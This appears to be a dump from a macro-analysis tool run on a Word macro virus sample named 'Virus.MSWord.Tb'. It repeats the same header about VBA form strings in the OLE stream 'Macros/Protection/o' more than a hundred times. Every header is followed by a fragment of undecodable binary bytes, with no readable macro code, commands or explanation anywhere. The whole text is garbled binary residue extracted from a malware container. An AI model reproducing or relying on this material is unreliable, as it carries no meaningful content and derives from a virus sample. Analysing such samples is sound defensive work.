-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�y����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���}E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���i`�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������x�l
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���qGC
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�xԡ���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
oGՓ����d��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����׆
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�e���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��<�hAPF���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��.RiwAU�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
')c>�(�F�>
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�͐�V2��Bc��i~�+�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��7

<=����L�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U����ר\�.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�5�Ŝ;%�4
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�'X5v���U
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
AY$y�ܝZ$�S��t6D�P�ޙh�>V"tb_�(���<
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���]h̝
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]�����z
��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J��mڳ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�=�6��$���}���㶏
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
7k��i
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��墖J���R?��<F�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
缑Ӯl3=�ߋ�@�=������)��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f�UU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��y�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
%���Y	
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ъ{�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ay�����a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`���Y�ˏ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�Hۅ�ԡ�SU
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0%��EyN�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ɤ�c�H�F\Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ppNГ�m�g@�2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
M:��uW
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
yUO[�Y��6詤=.�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��U�f'$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;N*��RYǗ�aBZ�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
L~���>b��Y�Y骪z�g��
�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J�i�e��Ͱ�F����ک��2�B���jC����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d��U��J+��.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-��.�l��V�#��f�͜
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t�n���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��k��vj૙"
��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#,R�����*o�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����e�
��R�q���+j�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
o�o���+��ĺ{��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p�*_�R��jä�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<s��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s�:�\�����V jo�O���������(3
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�0�\C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��4�|��tgk��xC-��m�ك3y�̀��f\��C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��G>2
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�+����Tםe�˝4ۍ�5�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���o�8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��-����^����pz著���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
>l�æX;����r�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|��G�z�u���ˀP����r�z덖~�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�3�<�d,>��#p}�vü}��_
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��w��2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��h'=
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:/rks
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
J�r�3@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

PvB�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�g?�-0L��`�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
8Pu'����&?
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�or���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���,M-c�� 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���!i���a
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
q�B��p�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��?�m�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-Q�+�R�uN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�7;D=��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
,ᗶ8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
"n�_�#��8
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b��l`��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��zB�$
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G�O��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�&y�MAN�8L�'
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8��Q����'�7�W�ᔚ���hI�,
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��8�d�vI
`Ȳ'�tWO"�F�����8�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�8�n����|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 �ـm60�v`f3/QNI����|
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��'P�,���wz��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��9ȭ�s�yh'A
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ѩ��2��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��F�(5p�+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��QY�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x��H%j�7
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 R���]#
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
MW�͞�T
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�ӟ6�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��>'hN�n����^L	08�65��T*J�PԞ6��>u)L�(E�:����j
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
&��V��Q�[�AW��V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
R�/Ť��
Vkf
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��X��5�S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ͩ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H���V6�ÌiY!J���b
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��g=k�|�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
	��6�Z����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~�mmq�[
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
}-)f�۶���=�mqi�\���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P��"W��M�v��\��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�G�.)t�\�^���M�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^�Z"��/z�;_��ͽ���~ѫ_�V
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�cH@o
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���ⶲ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�p�e1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���8�-�g,�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
`�}y|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��+�1�ǋ�&�V�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
^r����+
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wʖ �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�2 X�.�A<�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
s��[�-��l����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
lN��<g��Yͼ��I�|�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Y΀�3��<h%�9�iN���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�hwm���;�%
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�f6[z�gδ��lhI�9Ӄ���1mi6CZi�&
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
]7R�����t�Wc�֬�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�O��Y�:׵
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��!��֗������F��B`����2[�K��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��=@g�9�w�v4e�mp
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
a�u�vZ�QtO���>��7<U�ۃ�C
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���X_9�Y�7���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ic
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
C@����;$`�����+~��cj���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�4\�~q�b��n�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��*/��Q��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tb' - OLE stream: 'Macros/Protection/o'
